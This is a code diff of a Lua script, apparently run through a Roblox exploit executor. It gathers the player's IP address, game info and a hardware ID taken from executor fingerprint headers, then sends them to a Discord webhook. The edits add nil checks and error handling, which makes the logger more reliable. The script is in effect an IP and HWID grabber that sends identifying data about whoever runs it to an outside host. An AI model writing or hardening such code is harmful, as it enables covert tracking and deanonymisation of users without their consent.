@@ -6,7 +6,7 @@ local function main()
     end)
 
     if not success then
-        IP = "Unable to fetch IP: " .. ipError
+        IP = "Unable to fetch IP: " .. tostring(ipError)
     end
 
     -- Get the local player
@@ -26,7 +26,7 @@ local function main()
     end)
 
     if not success then
-        info = {Name = "Unknown", Description = "Unable to fetch game info: " .. infoError}
+        info = {Name = "Unknown", Description = "Unable to fetch game info: " .. tostring(infoError)}
     end
 
     -- Define the HTTP request function
@@ -47,24 +47,32 @@ local function main()
     local hwid = ""
     local success, hwidError = pcall(function()
         local response = http_request({Url = 'https://httpbin.org/get', Method = 'GET'})
-        if response.StatusCode == 200 then
+        if response and response.StatusCode == 200 then
             body = response.Body
-            local decoded = game:GetService('HttpService'):JSONDecode(body)
-            local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"}
+            if body then
+                local decoded = game:GetService('HttpService'):JSONDecode(body)
+                local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"}
 
-            for _, v in pairs(hwid_list) do
-                if decoded.headers[v] then
-                    hwid = decoded.headers[v]
-                    break
+                if decoded and decoded.headers then
+                    for _, v in pairs(hwid_list) do
+                        if decoded.headers[v] then
+                            hwid = decoded.headers[v]
+                            break
+                        end
+                    end
+                else
+                    hwidError = "Invalid response format: headers are missing"
                 end
+            else
+                hwidError = "Response body is nil"
             end
         else
-            hwidError = "HTTP request failed with status: " .. response.StatusCode
+            hwidError = "HTTP request failed with status: " .. tostring(response and response.StatusCode or "Unknown")
         end
     end)
 
     if not success then
-        hwid = "Unable to fetch HWID: " .. (hwidError or "Unknown error")
+        hwid = "Unable to fetch HWID: " .. tostring(hwidError)
     end
 
     -- Send data to Discord Webhook if HWID is present
@@ -129,7 +137,7 @@ local function main()
         end)
 
         if not success then
-            print("Failed to send data to Discord: " .. postError)
+            print("Failed to send data to Discord: " .. tostring(postError))
         end
     else
         print("No HWID found or HWID fetch error.")
